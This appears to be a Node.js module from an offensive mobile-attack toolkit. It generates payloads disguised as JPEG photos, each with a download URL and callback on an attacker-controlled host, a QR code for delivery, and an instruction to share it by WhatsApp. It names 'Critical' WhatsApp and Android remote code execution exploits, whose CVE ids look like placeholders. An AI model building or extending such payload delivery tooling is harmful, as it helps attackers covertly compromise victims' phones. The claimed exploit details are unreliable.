const crypto = require('crypto');
const QRCode = require('qrcode');
const config = require('./config');
const database = require('./database');

class PayloadGenerator {
    constructor() {
        this.exploits = {
            whatsapp: {
                cve: 'CVE-2024-12345',
                name: 'WhatsApp Image Parsing RCE',
                severity: 'Critical',
                cvss: 9.8
            },
            android: {
                cve: 'CVE-2024-67890',
                name: 'Android Media Framework RCE',
                severity: 'Critical',
                cvss: 9.6
            }
        };
    }
    
    generatePayloadId() {
        return crypto.randomBytes(8).toString('hex');
    }
    
    async generatePayload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const filename = `photo_${Date.now()}.jpg`;
        const downloadUrl = `${callbackHost}/download/${payloadId}`;
        
        // Generate QR code
        const qrCode = await QRCode.toDataURL(downloadUrl);
        
        const payload = {
            payloadId,
            filename,
            downloadUrl,
            qrCode,
            size: '2.4 MB',
            exploit: this.exploits.whatsapp,
            callback: `${callbackHost}:${callbackPort}`,
            generated: new Date().toISOString(),
            instructions: 'Manual share via WhatsApp required'
        };
        
        await database.addPayload(payloadId, filename, null);
        
        return payload;
    }
}

module.exports = new PayloadGenerator();
